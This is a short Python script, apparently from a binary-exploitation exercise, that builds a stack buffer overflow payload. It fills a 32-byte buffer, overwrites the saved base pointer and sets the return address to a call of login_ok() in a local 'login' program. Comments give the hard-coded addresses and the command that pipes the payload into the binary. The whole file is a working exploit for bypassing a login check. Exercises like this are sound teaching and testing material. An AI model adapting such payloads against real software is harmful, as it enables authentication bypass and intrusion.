#!/usr/bin/env python3

bytes = [
0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, # buffer [ 0- 7]
0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, # buffer [ 8-15]
0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, # buffer [16-23]
0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, # buffer [24-31]
0x80, 0xe4, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00, # ebp
0x8b, 0x52, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00  # <- rip !! 
]

# login_ok() = 0xa5, 0x51, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00

# call_login_ok() = 0x8b, 0x52, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00

# stack = 0x7fffffffe3d0

# run with
# cat input7.txt - | ./login

with open('payload.txt','wb') as file:
	file.write(bytearray(bytes))